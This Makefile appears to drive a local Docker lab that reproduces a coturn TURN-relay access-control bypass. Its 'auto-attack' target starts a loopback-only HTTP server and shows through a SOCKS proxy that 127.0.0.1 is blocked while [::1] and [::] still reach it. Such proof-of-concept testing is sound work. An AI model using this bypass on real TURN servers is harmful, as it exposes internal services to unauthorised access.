DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")

SERVICE ?=
CHECK_WAIT_SEC ?= 8

start:
	@$(DOCKER_COMPOSE) up -d --remove-orphans

stop:
	@$(DOCKER_COMPOSE) down --remove-orphans

follow-coturn:
	@docker logs coturn --follow

start-stunner:
	@docker exec -it stunner sh

build:
	@$(DOCKER_COMPOSE) build $(SERVICE)

coturn-http-start:
	@echo "[*] Starting loopback HTTP server on coturn (::1:8000)..."
	@docker exec -d coturn sh -lc "python3 -m http.server 8000 --bind ::1 >/tmp/coturn-http.log 2>&1"

coturn-http-stop:
	@docker exec coturn sh -lc "ps -eo pid,args | grep 'http.server 8000 --bind ::1' | grep -v grep | awk '{print \$$1}' | xargs -r kill -TERM || true"

check-loopback-blocked:
	@echo "[*] Check 1/3: 127.0.0.1 should be blocked..."
	@if docker exec stunner sh -lc "curl -fsS --max-time 5 -x socks5h://127.0.0.1:9999 http://127.0.0.1:8000 >/tmp/check1.out 2>/tmp/check1.err"; then \
		echo "[!] FAIL: request to 127.0.0.1 unexpectedly succeeded."; \
		exit 1; \
	else \
		echo "[+] PASS: 127.0.0.1 blocked as expected."; \
	fi

check-ipv6-loopback-bypass:
	@echo "[*] Check 2/3: [::1] bypass should succeed..."
	@docker exec stunner sh -lc "curl -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::1]:8000/' >/tmp/check2.out"
	@echo "[+] PASS: [::1] bypass succeeded."

check-ipv6-any-bypass:
	@echo "[*] Check 3/3: [::] bypass should succeed..."
	@docker exec stunner sh -lc "curl -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::]:8000/' >/tmp/check3.out"
	@echo "[+] PASS: [::] bypass succeeded."

bypass-check:
	@$(MAKE) check-loopback-blocked
	@$(MAKE) check-ipv6-loopback-bypass
	@$(MAKE) check-ipv6-any-bypass

auto-attack: stop build start
	@echo "[*] Waiting for coturn/stunner readiness ($(CHECK_WAIT_SEC)s)..."
	@sleep $(CHECK_WAIT_SEC)
	@$(MAKE) coturn-http-stop
	@$(MAKE) coturn-http-start
	@sleep 1
	@$(MAKE) bypass-check
